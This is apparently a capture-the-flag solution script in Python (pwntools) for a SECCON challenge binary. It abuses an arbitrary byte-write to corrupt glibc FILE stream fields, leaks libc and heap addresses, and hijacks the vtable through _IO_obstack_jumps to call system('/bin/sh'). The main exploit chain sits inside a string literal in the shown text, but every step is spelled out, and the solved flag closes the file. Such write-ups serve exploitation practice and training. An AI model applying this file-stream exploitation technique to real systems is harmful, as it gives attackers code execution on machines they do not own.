#!/usr/bin/python3
from pwn import *
# # break in fflush if needed to inspect the file stream
gs = '''
continue
'''
elf = context.binary = ELF('./chall')
context.terminal = ['tmux', 'splitw', '-hp', '70']
libc = elf.libc

def start():
    if args.GDB:
        return gdb.debug('./chall', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./chall')

r = start()
#r.timeout = 1
def flush():
    r.sendline(b"1")
    #r.recvuntil(b">")

def trick(offset, value):
    r.sendline(b"2")
#    sleep(1)
    r.sendlineafter(b"offset:", str(offset).encode())
    r.sendlineafter(b"value:", str(value))
    r.recvuntil(b">")


def write_addr(offset, addr):
    addr = p64(addr)
    for i in range(8):
        trick(offset+i, addr[i])

#========= exploit here ===================
# Setting the offsets for the filestream
_flags =0x0
_IO_read_ptr = 8
_IO_read_end = 0x10
_IO_read_base = 0x18
_IO_write_base = 0x20
_IO_write_ptr = 0x28
_IO_write_end = 0x30
_IO_buf_base = 0x38
_IO_buf_end = 0x40
_IO_save_base = 0x48
_IO_backup_base = 0x50
_IO_save_end = 0x58
_markers = 0x60
_chain = 0x68
_fileno = 0x70
_mode=0xc0
_vtable = 0xd8

'''
#executing _IO_file_doallocate to populate _IO_buf_base with a heap address

trick(_vtable, 0xa8)
flush()
sleep(1)


#restoring the vtable
trick(_vtable, 0xa0)
#making  _IO_write_ptr > _IO_write_base 
trick(_IO_write_ptr, 1)
flush()
sleep(1)
#leaking libc
trick(_fileno, 1)
trick(_IO_write_ptr, 0x78)
trick(_IO_write_base, 0x70)
trick(_IO_read_end, 0x70)
flush()
sleep(1)
#receiving the leak and calculating libc base address
leak = u64(r.recvuntil(b"Done.").split(b"Done.")[0][1:8].ljust(8,b"\x00"))
log.info(f"leak = {hex(leak)}")
libc.address = leak - 0x1e8f60
log.info(f"libc = {hex(libc.address)}")
#getting a heap leak
trick(_fileno, 1)
#calculating topchunf address in the main arena
topchunk = libc.address + 0x1ecbe0
log.info(f"top_chunk = {hex(topchunk)}")
write_addr(_IO_write_ptr, topchunk+8)
write_addr(_IO_write_base, topchunk)
write_addr(_IO_read_end, topchunk)
#write_addr(_flags, (0xfbad1800 | 0x8000))
sleep(1)
flush()
#receiving the leak and calculating addresses
heap_leak = u64(r.recvuntil(b"Done.").split(b"Done.")[0][1:8].ljust(8, b"\x00"))
log.info(f"heap_leak = {(hex(heap_leak))}")
heap_base = heap_leak - 0x2480
log.info(f"Heap base = {hex(heap_base)}")

#shifting the vtable to point __sync to _IO_obstack_jumps 
shift_obstack_jumps = libc.address + 0x1e9218
log.info(f"shift_obstack_jumps = {hex(shift_obstack_jumps)}")
write_addr(_vtable, shift_obstack_jumps)

#writing the obstack struct pointers
write_addr(0xe0, heap_base+0x2a0)
write_addr(_flags, heap_base+0x2a0)

#setting arguments for CALL_FREEFUN within _obstack_newchunk
log.info(f"system = {hex(libc.sym.system)}")
write_addr(_IO_backup_base, 0xdeadbeef)
write_addr(_IO_buf_base, libc.sym.system)	# function to call

log.info(f"/bin/sh = {hex(next(libc.search(b'/bin/sh')))}")
write_addr(_IO_save_base, next(libc.search(b'/bin/sh')))	# arg of function
#drop a shell
flush()
'''
#========= interactive ====================
r.interactive()
#SECCON{r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3}